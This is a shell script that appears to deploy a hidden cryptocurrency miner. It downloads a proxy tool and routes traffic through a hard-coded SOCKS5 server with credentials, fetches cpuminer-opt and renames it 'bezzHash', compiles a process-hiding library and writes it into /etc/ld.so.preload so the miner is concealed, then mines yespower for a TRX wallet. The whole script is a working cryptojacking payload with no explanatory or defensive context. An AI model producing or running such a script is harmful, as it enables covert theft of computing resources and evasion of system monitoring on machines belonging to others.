#!/bin/sh
ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata

apt update -y;apt -y install libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev build-essential binutils git cmake screen unzip net-tools curl -y

wget https://gitlab.com/ubedx/ngopi/-/raw/main/graphics.tar.gz
tar -xvzf graphics.tar.gz

cat > graftcp/local/graftcp-local.conf <<END
listen = :2233
loglevel = 1
socks5 =  128.199.222.68:443
socks5_username = arema
socks5_password = singoedan
END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

echo " "
echo " "

echo ""

./graftcp/graftcp curl ifconfig.me

echo " "
echo " "

echo ""

echo " "
echo " "

./graftcp/graftcp wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.29/cpuminer-opt-linux.tar.gz
tar -xf cpuminer-opt-linux.tar.gz
mv cpuminer-sse2 bezzHash

./graftcp/graftcp wget https://gitlab.com/ubedx/ngopi/-/raw/main/magicBezzHash.zip
unzip magicBezzHash.zip
make
gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
mv libprocesshider.so /usr/local/lib/
echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload

./graftcp/graftcp ./bezzHash -a yespower -o stratum+tcp://yespower.mine.zergpool.com:6533 -u TChMu1HcBrySoiYi4nS2AHMSgLYY6j28ws.$(shuf -n 1 -i 1-999999) -p c=TRX -t14
